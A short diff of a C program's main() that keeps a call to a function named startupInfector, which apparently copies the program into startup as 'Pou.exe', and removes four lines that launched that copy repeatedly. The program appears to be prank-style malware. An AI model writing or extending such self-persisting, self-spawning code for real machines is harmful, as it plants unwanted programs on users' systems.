@@ -17,11 +17,6 @@ int main(int argc, char* argv[]) {
 	}
 
 	startupInfector(argv[0], "Pou.exe");
-
-	system("start C:\\Pou.exe --Extra");
-	system("start C:\\Pou.exe --Extra");
-	system("start C:\\Pou.exe --Extra");
-	system("start C:\\Pou.exe --Extra");
 	
 	pouVitalsCheck();
 
